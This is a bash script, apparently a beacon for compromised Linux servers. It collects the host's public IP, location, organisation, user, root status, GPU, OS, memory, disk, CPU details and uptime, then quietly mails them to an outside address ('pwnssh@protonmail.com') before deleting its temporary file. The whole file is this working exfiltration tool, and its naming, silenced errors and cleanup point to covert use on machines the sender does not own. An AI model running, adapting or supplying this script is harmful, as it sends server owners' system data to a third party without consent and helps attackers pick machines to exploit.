#!/bin/bash

IP=`curl -s 66.171.248.178 2> /dev/null`
if [ -z "$IP" ];
then
	IP="localhost"
	COUNTRY="✖"
	ORG="✖"
else
	COUNTRY=`curl -s 208.95.112.1/line/?fields=country 2> /dev/null`
	ORG=`curl -s 208.95.112.1/line/?fields=org 2> /dev/null`
fi
if [ "$EUID" = "0" ] || [ $(id -u) = "0" ];	then
	ROOT="✔"
else
	ROOT="✖"
fi
if which lspci > /dev/null 2>&1;	then
	GPU=$(lspci | grep VGA | cut -f5- -d ' ')
else
	GPU="✖"
fi
OS=$(cat /etc/*-release | awk '{print $1}' | head -n 1 | sed -e 's/\<DISTRIB_ID\>//g; s/=//g' | sed -e 's/\<PRETTY_NAME\>//g; s/"//g')
if [ -z "$OS" ];
then
	OS="✖"
fi
RAM=$(free -m | grep Mem | awk '{ printf "" $2/1000 " GB\n\n" }')
DISK=$(df -h --total | grep total |awk '{ printf "" $2 "B\n\n" }')
MODEL=$(grep -m 1 "model name" /proc/cpuinfo | cut -d: -f2 | sed -e 's/^ *//' | sed -e 's/$//')
PROCS=$(grep -c ^processor /proc/cpuinfo)
STEP=$(grep -m 1 "stepping" /proc/cpuinfo | cut -d: -f2 | sed -e 's/^ *//' | sed -e 's/$//')
BOGO=$(grep -m 1 "bogomips" /proc/cpuinfo | cut -d: -f2 | sed -e 's/^ *//' | sed -e 's/$//')
UPTIME=$(</proc/uptime)
UPTIME=${UPTIME%%.*}
bold=$(tput bold)
DAYS=$(( UPTIME/60/60/24 ))
SECS=$(( UPTIME%60 ))
MINS=$(( UPTIME/60%60 ))
HRS=$(( UPTIME/60/60%24 ))
VER=$(uname -a)

echo "Subject: Server Information @ Reboot" > mail.txt
echo "►=====================INFO SCRIPT BY p3rL=========================◄" >> mail.txt
echo "[₪]► IP                    › $IP" >> mail.txt
echo "[₪]► USER                  › $USER" >> mail.txt
echo "[₪]► COUNTRY               › $COUNTRY" >> mail.txt
echo "[₪]► ORG                   › $ORG" >> mail.txt
echo "[₪]► ROOT                  › $ROOT" >> mail.txt
echo "[₪]► GPU                   › $GPU" >> mail.txt
echo "[₪]► OS                    › $OS" >> mail.txt
echo "[₪]► RAM                   › $RAM" >> mail.txt
echo "[₪]► DISK                  › $DISK" >> mail.txt
echo "[₪]► MODEL                 › $MODEL" >> mail.txt
echo "[₪]► PROCESSORS            › $PROCS" >> mail.txt
echo "[₪]► STEPPING              › $STEP" >> mail.txt
echo "[₪]► BOGOMIPS              › $BOGO" >> mail.txt
echo "[₪]► UPTIME                › Days > $DAYS | Hours > $HRS | Minutes > $MINS" >> mail.txt
echo "[₪]► UNAME                 › $VER" >> mail.txt

sendmail "pwnssh@protonmail.com" < mail.txt 2>/dev/null
sed -i '1d' mail.txt
mail -s "Server Information @ Reboot" "pwnssh@protonmail.com" < mail.txt 2>/dev/null
rm -rf mail.txt
